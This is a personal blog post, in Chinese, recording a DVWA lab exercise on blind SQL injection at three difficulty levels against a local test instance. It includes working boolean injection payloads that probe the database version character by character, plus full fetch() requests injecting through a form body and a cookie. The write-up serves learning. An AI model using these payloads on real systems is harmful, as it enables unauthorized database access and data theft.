<!doctype html><html lang=zh><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>DVWA上手记录-SQL盲注</title><meta content=DVWA上手记录-SQL盲注 name=title><meta content=一点点从这个世界上消失。 name=description><meta content=website property=og:type><meta content=https://nnnewb.github.io/posts/2022/get-start-dvwa-07/ property=og:url><meta content="weakptr's blog" property=og:site_name><meta content=DVWA上手记录-SQL盲注 property=og:title><meta content=一点点从这个世界上消失。 property=og:description><meta content=https://nnnewb.github.io/image/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://nnnewb.github.io/posts/2022/get-start-dvwa-07/ property=twitter:url><meta content=DVWA上手记录-SQL盲注 property=twitter:title><meta content=一点点从这个世界上消失。 property=twitter:description><meta content=https://nnnewb.github.io/image/favicon.ico property=twitter:image><link href=https://nnnewb.github.io/posts/2022/get-start-dvwa-07/ rel=canonical><link rel="shortcut icon" href=https://nnnewb.github.io/image/favicon.ico type=image/x-icon><link href=https://nnnewb.github.io/css/reset.css rel=stylesheet><link href=https://nnnewb.github.io/css/pallete.css rel=stylesheet><link href=https://nnnewb.github.io/css/suCSS.css rel=stylesheet><link href=https://nnnewb.github.io/archive.css rel=stylesheet><link href=https://nnnewb.github.io/style.css rel=stylesheet><script defer src=https://nnnewb.github.io/js/script.js></script><link crossorigin href=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css integrity=sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y rel=stylesheet><script crossorigin defer integrity=sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js></script><script crossorigin defer integrity=sha384-zWYbd0NBwgTsgIdFKVprSfTh1mbMPe5Hz1X3yY4Sd1h/K1cQoUe36OGwAGz/PcDy src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/mathtex-script-type.min.js></script><script crossorigin defer integrity=sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js></script><script>document.addEventListener("DOMContentLoaded", function () {
        renderMathInElement(document.body, {
            // customised options
            // • auto-render specific keys, e.g.:
            delimiters: [
                { left: '$$', right: '$$', display: true },
                { left: '$', right: '$', display: false },
                { left: '\\(', right: '\\)', display: false },
                { left: '\\[', right: '\\]', display: false }
            ],
            // • rendering keys, e.g.:
            throwOnError: true
        });
    });</script><script src=https://cdn.jsdelivr.net/npm/mermaid@11.6.0/dist/mermaid.min.js></script><script>document.addEventListener('DOMContentLoaded', function () {
        // 查找所有具有 'pre' 标签且类名为 'language-mermaid' 的元素
        const mermaidElements = document.getElementsByClassName('language-mermaid');
        for (let i = 0; i < mermaidElements.length; i++) {
            const el = mermaidElements.item(i);
            if (el.tagName === "PRE" && !el.classList.contains('mermaid')) {
                el.innerHTML = el.textContent;
                el.classList.add('mermaid');
            }
        }

        mermaid.initialize({ startOnLoad: true, theme: 'dark', });
    })</script><script>if (window.location.hostname.toLowerCase() !== 'localhost' && window.location.hostname !== '127.0.0.1') {
        var _hmt = _hmt || [];
        (function () {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?dbb9df33a2de52aede8bccd84a7493ad";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    }</script><link href=https://chinese-fonts-cdn.deno.dev/packages/lxgwwenkaibright/dist/LXGWBright-Medium/result.css rel=stylesheet><link href=https://chinese-fonts-cdn.deno.dev/packages/maple-mono-cn/dist/MapleMono-CN-Regular/result.css rel=stylesheet><body><header><nav id=nav-bar><a href=/> 首页 </a>  /  <a href=/posts/> 文章 </a>  /  <a href=/categories/> 分类 </a>  /  <a href=/tags/> 标签 </a>  /  <a href=/search/> 搜索 </a>  /  <div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://nnnewb.github.io/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://nnnewb.github.io/click.ogg type=audio/ogg></audio></div></nav></header><main><h1>DVWA上手记录-SQL盲注</h1><p class=author-line>作于：2022-04-28 11:30 ，预计阅读时间 8 分钟<article><h2 id=qian-yan>前言</h2><p>SQL盲注会比一般的注入难度高很多，特别是经验不足的时候可以尝试的 payload 有限，就算有注入点也很难靠手里积累的那点 payload 测出来。一般这种时候用工具会好得多。<h2 id=yuan-li>原理</h2><p>SQL盲注指的是存在SQL注入，但SQL错误不回显。这种情况下报错攻击无效而且构造有效的 payload 会比较困难。但还是可以通过几个方面确定执行结果：<ol><li>页面显示内容。比如当SQL错误发生或<code>WHERE</code>、<code>ON</code>这样的条件子句不满足时和正常执行时网页内容不同。<li>如果正常执行和错误都返回一样的页面，还可以通过时间来判断SQL是否被执行，比如构造一个执行很慢的 payload 让 SQL 服务器跑，如果返回时间比正常时间久就说明SQL被执行了。<li>可能还有其他的？</ol><p>盲注还有个问题就是注入的查询可能不回显到前端，所以直接 <code>UNION</code> 一个查询曝出所有的表和列是不太可能的。但如果存在盲注的话至少会有一个比特的观测窗口，所以还是存在一个字符一个字符试过去的办法，比如表名第一个字符是<code>a</code>的表是否存在，表名第一个字符是<code>b</code>的表是否存在，如此如此。虽然慢而且对一些无法枚举的字段（比如存的是unicode，那总不能遍历整个码表；或者 <code>int</code>、<code>float</code>这样取值范围太大的类型）没辙。<h2 id=jie-ti>解题</h2><h3 id=lownan-du-shou-ji-xin-xi>Low难度：收集信息</h3><p><img alt=image-20220427165553250 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-07/image-20220427165553250.webp><p>一个普通表单，尝试输入数字。<p><img alt=image-20220427165613795 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-07/image-20220427165613795.webp><p>逻辑应该是检测这个用户id是否存在于数据库中，随便乱打个数字看看。<p><img alt=image-20220427165723361 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-07/image-20220427165723361.webp><p>看下目标是什么。<p><img alt=image-20220427165744902 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-07/image-20220427165744902.webp><p>猜解数据库版本。接着试一试是什么类型的注入，已知这个表单回显是存在/不存在，所以拼一个 <code>' or 1=1; --</code> 看看，把条件变成恒真。<p><img alt=image-20220427165955690 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-07/image-20220427165955690.webp><p>有效。<h3 id=lownan-du-jie-ti>Low难度：解题</h3><p>用 <code>or</code> 连接一个子查询，<code>SELECT EXISTS(SELECT * FROM sys.version WHERE mysql_version LIKE '5%'); --</code>。这个查询会判断是MySQL的版本是不是5开头。依次类推很快就能解出MySQL版本号。<pre style=color:#fdf4c1aa;background-color:#282828><code><span>' or (SELECT EXISTS(SELECT * FROM sys.version WHERE mysql_version LIKE '5%')); -- 
</span></code></pre><p>但是很快发现行不通，因为没有权限访问 <code>sys</code> 这个系统库（没有报错，我只能猜是这样）。<p>想了想再谷歌了一下盲注的payloads之后还行没什么头绪，<code>union</code>大概是不行的，因为回显只有exists和missing两种状态，union查出来也看不到。再翻了一下怎么用SQL查询MySQL版本之后发现除了<code>show variables</code>和<code>sys.version</code>之外，还可以试试<code>version</code>函数。用<code>SELECT SUBSTR(VERSION(),1,1)='5'</code>，然后逐个位判断（最好是先判断出这个字符串长度，用<code>length(version())>1</code>这样的 payload。）<p>于是做出下面一系列payload（mysql版本号是<code>x.y.z</code>格式，肯定不低于5位，直接从5开始判断）。<pre style=color:#fdf4c1aa;background-color:#282828><code><span>' or (SELECT LENGTH(VERSION())>5); -- true
</span><span>' or (SELECT LENGTH(VERSION())>6); -- false
</span></code></pre><p>只用了两个 payload 就确定了长度是 6。<p>接着判断第一位是不是5（因为5.x还是最常用的MySQL版本），后面逐位判断。（这里略了尝试的部分）<pre style=color:#fdf4c1aa;background-color:#282828><code><span>' or (SELECT SUBSTR(VERSION(),1,1)='5'); -- true
</span><span>' or (SELECT SUBSTR(VERSION(),2,1)='.'); -- true
</span><span>' or (SELECT SUBSTR(VERSION(),3,1)='7'); -- true
</span><span>' or (SELECT SUBSTR(VERSION(),4,1)='.'); -- true
</span><span>' or (SELECT SUBSTR(VERSION(),5,1)='3'); -- true
</span><span>' or (SELECT SUBSTR(VERSION(),6,1)='7'); -- true
</span></code></pre><p>所以数据库版本号是 <code>5.7.37</code>。<p>这种无聊的爆破工作显然是应该交给脚本的。之后研究sqlmap的时候会再回头看看怎么用sqlmap盲注这里。<h3 id=mediumnan-du-shou-ji-xin-xi>Medium难度：收集信息</h3><p><img alt=image-20220428092639212 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-07/image-20220428092639212.webp><p>和SQL注入题的medium难度一模一样。<h3 id=mediumnan-du-jie-ti>Medium难度：解题</h3><p>还是老样子，复制出请求，尝试提交个数字型注入。<pre class=language-js data-lang=js style=color:#fdf4c1aa;background-color:#282828><code class=language-js data-lang=js><span style=color:#fa5c4b>await </span><span style=color:#8ec07c>fetch</span><span>(</span><span style=color:#b8bb26>"http://localhost:8080/vulnerabilities/sqli_blind/"</span><span>, {
</span><span>  </span><span style=color:#b8bb26>"headers"</span><span>: {
</span><span>    </span><span style=color:#b8bb26>"accept"</span><span>: </span><span style=color:#b8bb26>"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"accept-language"</span><span>: </span><span style=color:#b8bb26>"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"cache-control"</span><span>: </span><span style=color:#b8bb26>"no-cache"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"content-type"</span><span>: </span><span style=color:#b8bb26>"application/x-www-form-urlencoded"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"pragma"</span><span>: </span><span style=color:#b8bb26>"no-cache"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"sec-ch-ua"</span><span>: </span><span style=color:#b8bb26>"\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Microsoft Edge\";v=\"100\""</span><span>,
</span><span>    </span><span style=color:#b8bb26>"sec-ch-ua-mobile"</span><span>: </span><span style=color:#b8bb26>"?0"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"sec-ch-ua-platform"</span><span>: </span><span style=color:#b8bb26>"\"Windows\""</span><span>,
</span><span>    </span><span style=color:#b8bb26>"sec-fetch-dest"</span><span>: </span><span style=color:#b8bb26>"document"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"sec-fetch-mode"</span><span>: </span><span style=color:#b8bb26>"navigate"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"sec-fetch-site"</span><span>: </span><span style=color:#b8bb26>"same-origin"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"sec-fetch-user"</span><span>: </span><span style=color:#b8bb26>"?1"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"upgrade-insecure-requests"</span><span>: </span><span style=color:#b8bb26>"1"
</span><span>  },
</span><span>  </span><span style=color:#b8bb26>"referrer"</span><span>: </span><span style=color:#b8bb26>"http://localhost:8080/vulnerabilities/sqli_blind/"</span><span>,
</span><span>  </span><span style=color:#b8bb26>"referrerPolicy"</span><span>: </span><span style=color:#b8bb26>"strict-origin-when-cross-origin"</span><span>,
</span><span>  </span><span style=color:#b8bb26>"body"</span><span>: </span><span style=color:#b8bb26>"id=999+or+1%3D1;+--+&Submit=Submit"</span><span>,
</span><span>  </span><span style=color:#b8bb26>"method"</span><span>: </span><span style=color:#b8bb26>"POST"</span><span>,
</span><span>  </span><span style=color:#b8bb26>"mode"</span><span>: </span><span style=color:#b8bb26>"cors"</span><span>,
</span><span>  </span><span style=color:#b8bb26>"credentials"</span><span>: </span><span style=color:#b8bb26>"include"
</span><span>});
</span></code></pre><p><img alt=image-20220428092945875 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-07/image-20220428092945875.webp><p>在<code>id=999 or 1=1; --</code>这个payload下返回了 <code>exists</code>，剩下的就是和 Low 难度差不多的方式爆破出版本号，就不复述了。<h3 id=highnan-du-shou-ji-xin-xi>High难度：收集信息</h3><p><img alt=image-20220428093304965 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-07/image-20220428093304965.webp><p>和SQL注入题的High难度差不多，但注意到题中提示变成了 <code>Cookie ID set!</code>，于是看一眼 Cookie。<p><img alt=image-20220428093423840 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-07/image-20220428093423840.webp><p>id直接保存在cookies里，这就简单多了。<h3 id=highnan-du-jie-ti>High难度：解题</h3><p>复制出请求（注意复制出 NodeJS fetch，复制浏览器 fetch 不会复制出cookie），把cookie里的id改成<code>0 or 1=1 --</code>，URL编码。<pre class=language-js data-lang=js style=color:#fdf4c1aa;background-color:#282828><code class=language-js data-lang=js><span style=color:#fa5c4b>let </span><span style=color:#fdf4c1>resp </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>await </span><span style=color:#8ec07c>fetch</span><span>(</span><span style=color:#b8bb26>"http://localhost:8080/vulnerabilities/sqli_blind/"</span><span>, {
</span><span>  </span><span style=color:#b8bb26>"headers"</span><span>: {
</span><span>    </span><span style=color:#b8bb26>"accept"</span><span>: </span><span style=color:#b8bb26>"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"accept-language"</span><span>: </span><span style=color:#b8bb26>"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"cache-control"</span><span>: </span><span style=color:#b8bb26>"no-cache"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"pragma"</span><span>: </span><span style=color:#b8bb26>"no-cache"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"sec-ch-ua"</span><span>: </span><span style=color:#b8bb26>"\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Microsoft Edge\";v=\"100\""</span><span>,
</span><span>    </span><span style=color:#b8bb26>"sec-ch-ua-mobile"</span><span>: </span><span style=color:#b8bb26>"?0"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"sec-ch-ua-platform"</span><span>: </span><span style=color:#b8bb26>"\"Windows\""</span><span>,
</span><span>    </span><span style=color:#b8bb26>"sec-fetch-dest"</span><span>: </span><span style=color:#b8bb26>"document"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"sec-fetch-mode"</span><span>: </span><span style=color:#b8bb26>"navigate"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"sec-fetch-site"</span><span>: </span><span style=color:#b8bb26>"same-origin"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"upgrade-insecure-requests"</span><span>: </span><span style=color:#b8bb26>"1"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"cookie"</span><span>: </span><span style=color:#b8bb26>"id=0 or 1=1 -- ; PHPSESSID=9nmb4p6uqpf33edc0gvt0s38k5; security=high"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"Referer"</span><span>: </span><span style=color:#b8bb26>"http://localhost:8080/vulnerabilities/sqli_blind/"</span><span>,
</span><span>    </span><span style=color:#b8bb26>"Referrer-Policy"</span><span>: </span><span style=color:#b8bb26>"strict-origin-when-cross-origin"
</span><span>  },
</span><span>  </span><span style=color:#b8bb26>"body"</span><span>: </span><span style=color:#d3869b>null</span><span>,
</span><span>  </span><span style=color:#b8bb26>"method"</span><span>: </span><span style=color:#b8bb26>"GET"
</span><span>});
</span></code></pre><p>初始化一个node包（<code>package.json</code>把<code>type</code>设置成<code>module</code>），安装<code>node-fetch</code>，补个 <code>import fetch from "node-fetch";</code> 然后调试上面的脚本，发现提示 MISSING。<p><img alt=image-20220428095318913 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-07/image-20220428095318913.webp><p>难道是字符型注入？改成<code>' or 1=1 --</code>再试一次。<p><img alt=image-20220428095720005 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-07/image-20220428095720005.webp><p>这次提示变成了exists，所以是字符型注入。接下来就是用 Low 难度的 Payload 一个一个试过去，爆破出版本号。<h2 id=zong-jie>总结</h2><p>说说我打完盲注的想法。其实最大的问题是没信心，不知道到底什么结果，没有任何错误提示。有源码的情况下白盒还比较容易构造 payload，黑盒的情况下盲注构造payload倒是很考验心态，因为总是不成功没反应打击很大，会怀疑是不是自己判断错了。<p>而且很费时间。<p>想确认是否有注入点感觉最好的办法还是先拿工具脚本试水。不过有防火墙的情况下可能又有问题=。=像是<code>or 1=1</code>这种payload很可能被杀。工具没辙的时候还得看人有没有新点子，但这又是大佬的领域了...<p>嗯，我也想做大佬啊。</article><p class=tags-data><a href=/tags/security>/security/</a> <a href=/tags/dvwa>/dvwa/</a> <a href=/tags/sqli>/sqli/</a></p><script data-repo-id="MDEwOlJlcG9zaXRvcnkzOTg0ODYyMTg=" async crossorigin data-category=Announcements data-category-id=DIC_kwDOF8Bqys4Cegmn data-emit-metadata=0 data-input-position=bottom data-lang=zh-CN data-mapping=pathname data-reactions-enabled=1 data-repo=nnnewb/nnnewb.github.io data-strict=0 data-theme=noborder_light id=giscus_script src=https://giscus.app/client.js></script></main><footer><hr><div id=footer-container><div><p style=text-align:center>Copyright © 2018-2024 weakptr <a href=mailto:weak_ptr@outlook.com>&lt;weak_ptr@outlook.com></a><p style=text-align:center>Built with <a rel="noopener noreferrer" href=https://www.getzola.org target=_blank>Zola</a> using <a rel="noopener noreferrer" href=https://github.com/Speyll/anemone target=_blank>anemone</a> theme, <a rel="noopener noreferrer" href=https://speyll.github.io/suCSS/ target=_blank>suCSS</a> framework & <a rel="noopener noreferrer" href=https://github.com/Speyll/veqev target=_blank>veqev</a>, modified by <a rel="noopener noreferrer" href=https://github.com/nnnewb/ target=_blank>nnnewb</a>.<p style=text-align:center>Theme and color theme licensed under <a rel="noopener noreferrer" href=https://en.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a>.</div></div></footer>